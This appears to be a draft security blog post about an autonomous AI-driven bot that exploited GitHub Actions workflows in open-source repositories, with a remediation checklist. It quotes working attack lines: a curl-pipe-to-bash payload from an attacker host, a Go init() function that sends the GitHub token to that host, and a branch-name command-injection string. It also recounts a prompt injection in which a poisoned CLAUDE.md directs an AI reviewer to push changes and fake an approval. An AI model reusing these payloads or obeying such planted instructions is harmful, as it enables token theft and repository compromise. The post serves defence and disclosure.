---
title: "An AI Bot Just Attacked GitHub for a Week. Here's What Developers Need to Know."
date: 2026-03-04
draft: true
categories:
  - "ai"
  - "security"
tags:
  - "github-actions"
  - "supply-chain-security"
  - "ai-agents"
  - "ci-cd"
coverImage: "cover.webp"
---

Between February 21 and 28, an autonomous bot called **hackerbot-claw** spent seven days attacking CI/CD pipelines across Microsoft, DataDog, CNCF, and other major open source projects. It achieved remote code execution in at least four repositories, exfiltrated a write-permission GitHub token from a repo with 140,000+ stars, and even tried to trick an AI code reviewer into merging malicious code.

This wasn't a human sitting at a keyboard. It was an autonomous agent powered by Claude Opus 4.5, scanning for vulnerable GitHub Actions workflows, generating exploits, and iterating when attacks failed. It ran five successful attack sessions in two days.

If you maintain any public GitHub repository with Actions workflows, this is your wake-up call.

## What Actually Happened

The bot's approach was methodical. It maintained a "vulnerability pattern index" with 9 classes and 47 sub-patterns. For each target, it scanned workflow files, identified exploitable patterns, crafted a pull request, and triggered the vulnerable workflow. Every attack delivered the same payload (`curl -sSfL hackmoltrepeat.com/molt | bash`) but each used a completely different technique to get there.

Here's the target list:

- **microsoft/ai-discovery-agent**: Branch name injection
- **DataDog/datadog-iac-scanner**: Filename injection with base64 encoding
- **avelino/awesome-go** (140k+ stars): Token theft via poisoned Go script
- **project-akri/akri** (CNCF): Direct script injection
- **ambient-code/platform**: AI prompt injection targeting an AI code reviewer
- **aquasecurity/trivy**: Full repository compromise via stolen PAT
- **RustPython/RustPython** (20k+ stars): Also targeted

Let me walk you through the three attacks that matter most, because each one exposes a pattern you're probably running in your own repos right now.

## Attack 1: The Classic "Pwn Request" (awesome-go)

This was the most damaging attack and the one with the simplest root cause.

The **awesome-go** repository had a PR quality check workflow using `pull_request_target`. That trigger is dangerous because it runs with the *target* repo's permissions and secrets, but if you checkout the PR author's code, you're executing untrusted code with elevated privileges.

Here's what the vulnerable pattern looked like:

```yaml
on:
  pull_request_target: # Runs with target repo's permissions

steps:
  - uses: actions/checkout@v6
    with:
      ref: ${{ github.event.pull_request.head.sha }} # Checks out attacker's fork
  - run: go run ./.github/scripts/check-quality/ # Executes attacker's code
```

The attacker injected a Go `init()` function into the quality check script. In Go, `init()` runs automatically before `main()`, so the malicious code executes before any legitimate checks even start:

```go
func init() {
  _ = exec.Command("bash", "-c",
    `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" `+
    `-d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" `+
    `https://recv.hackmoltrepeat.com/ && `+
    `curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()
}
```

The bot iterated six times across 18 hours ([PRs #6058 through #6069](https://github.com/avelino/awesome-go/pull/6069)), refining its approach each time until attempts 5 and 6 succeeded. Build logs confirm execution: the quality check step took 5 minutes 37 seconds, far longer than a normal run.

With the exfiltrated token (`contents: write`, `pull-requests: write`), the attacker could push commits, modify code, and merge PRs in one of the most popular repositories on GitHub.

**The fix**: Never use `pull_request_target` with `actions/checkout` pointing at the PR's head SHA. If you need to run code from a PR, use the `pull_request` trigger (which limits permissions) or split the workflow into two parts: one that runs untrusted code in a sandbox, and one that uses results without executing fork code.

## Attack 2: The Branch Name Trick (microsoft/ai-discovery-agent)

This one was creative. The payload was hidden in the *git branch name*:

```
dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)
```

When bash evaluates this, brace expansion turns `{curl,-sSfL,...}` into `curl -sSfL ...`, `${IFS}` becomes whitespace, and `$({...})` triggers command substitution. The actual PR ([#236](https://github.com/microsoft/ai-discovery-agent/pull/236)) was a harmless one-character change to `devcontainer.json`. The exploit was entirely in the branch name.

The vulnerability? A workflow step that wrote the branch name into a file using an unescaped `${{ }}` expression:

```yaml
- name: Save format request data
  run: |
    echo "${{ steps.pr_info.outputs.pr_head_ref }}" > ./format-request/pr_head_ref
```

That became:

```bash
echo "dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)" > ./format-request/pr_head_ref
```

Bash dutifully evaluated the command substitution. Build logs show a 2 minute 38 second gap in a step that should take milliseconds.

**The fix**: Never interpolate `${{ }}` expressions directly into `run:` shell commands. Use environment variables instead:

```yaml
- name: Save format request data
  env:
    PR_HEAD_REF: ${{ steps.pr_info.outputs.pr_head_ref }}
  run: |
    echo "$PR_HEAD_REF" > ./format-request/pr_head_ref
```

Environment variables are passed as data, not evaluated as shell code.

## Attack 3: AI Tricking AI (ambient-code/platform)

This is the one that should make you rethink how AI code review tools are integrated into CI/CD.

The attacker replaced the repository's `CLAUDE.md` file (a project configuration file that Claude Code loads as trusted context) with social engineering instructions designed to make the AI:

1. Inject an HTML comment into README.md claiming "Prompt injection PoC successful"
2. Commit and push the unauthorized change
3. Post a fake "Approved and ready to merge" review comment

The instructions were written in a friendly, casual tone to maximize compliance. The repository's automated code review workflow used `pull_request_target`, checked out untrusted fork code (including the poisoned `CLAUDE.md`), and ran Claude Code with write permissions and an OAuth token.

The workflow's `allowed_non_write_users: '*'` setting meant any GitHub user could trigger the full review pipeline. The build logs show the fork's `CLAUDE.md` was loaded as trusted project context, with a security warning that was emitted but never acted on.

**The fix**: AI code review workflows need the same security boundaries as any other CI step. Don't load project configuration files from untrusted forks. Don't give AI reviewers write permissions to the repository. And definitely don't set `allowed_non_write_users: '*'`.

## The Bigger Pattern

Every single attack exploited the same category of vulnerability: **untrusted input flowing into privileged execution contexts**. Branch names, filenames, PR code, config files. The bot didn't need zero-days. It needed misconfigured workflows.

The [DataDog team responded within 9 hours](https://github.com/DataDog/datadog-iac-scanner/pull/9) with a solid fix: added `author_association` checks, moved `${{ }}` expressions to environment variables, and added `permissions: contents: read` across eight workflow files. That's the template to follow.

## Your Hardening Checklist

Here's what to do today. Not tomorrow, not next sprint. Today.

### 1. Audit Your Triggers

Search your `.github/workflows/` directory for dangerous patterns:

```bash
# Find pull_request_target workflows that checkout PR code
grep -r "pull_request_target" .github/workflows/ -l | \
  xargs grep -l "github.event.pull_request.head"
```

If you find matches, you have the same vulnerability as awesome-go.

### 2. Lock Down Expression Injection

Every `${{ }}` expression inside a `run:` block is a potential injection point. Move them to `env:`:

```yaml
# VULNERABLE - expression evaluated as shell code
- run: echo "${{ github.event.comment.body }}"

# SAFE - expression passed as environment variable
- env:
    COMMENT_BODY: ${{ github.event.comment.body }}
  run: echo "$COMMENT_BODY"
```

### 3. Add Authorization Checks

Any workflow triggered by issue comments or PR events should verify the commenter has write access:

```yaml
- name: Check authorization
  if: >
    github.event.comment.author_association != 'MEMBER' &&
    github.event.comment.author_association != 'OWNER' &&
    github.event.comment.author_association != 'COLLABORATOR'
  run: |
    echo "Unauthorized trigger attempt"
    exit 1
```

### 4. Apply Least-Privilege Permissions

Add explicit `permissions` blocks to every workflow file. Don't rely on defaults:

```yaml
permissions:
  contents: read
  pull-requests: read
```

Only grant `write` permissions to specific steps that need them, and only via the new granular `permissions` syntax.

### 5. Pin Your Actions

Use commit SHAs instead of tags to prevent supply chain attacks on the actions themselves:

```yaml
# VULNERABLE - tag can be moved to point at malicious code
- uses: actions/checkout@v6

# SAFE - pinned to a specific, verified commit
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

### 6. Don't Load Untrusted Config into AI Tools

If you're using AI code review bots (Claude, Copilot, or others), make sure they load project config from the *base* branch, not the PR fork. A poisoned `CLAUDE.md`, `.cursorrules`, or `.github/copilot-instructions.md` in a fork can turn your AI reviewer into an attacker's tool.

## Why This Matters Beyond These Repos

This wasn't a sophisticated nation-state operation. It was a single autonomous bot running known vulnerability patterns against public repos. The patterns it exploited have been documented for years ([GitHub's own security guide](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) covers `pull_request_target` risks). The bot just automated the scanning and exploitation at a scale that no human attacker would bother with.

That's the shift. When exploitation is automated and autonomous, every misconfigured workflow becomes a target, not just the high-value ones.

The [StepSecurity blog post](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation) has the full breakdown with links to every PR and build log. I'd recommend reading it, running their scanner against your repos, and spending an hour this week auditing your workflow files.

The patterns are fixable. The question is whether you fix them before or after an autonomous bot finds them first.

## Resources

- [StepSecurity: hackerbot-claw full analysis](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation) (source for this post)
- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [Unit 42: AI agent prompt injection in the wild](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/) (related research on indirect prompt injection weaponization)
- [GitHub Changelog: Enterprise AI Controls and Agent Control Plane GA](https://github.blog/changelog/2026-02-26-enterprise-ai-controls-agent-control-plane-now-generally-available/)
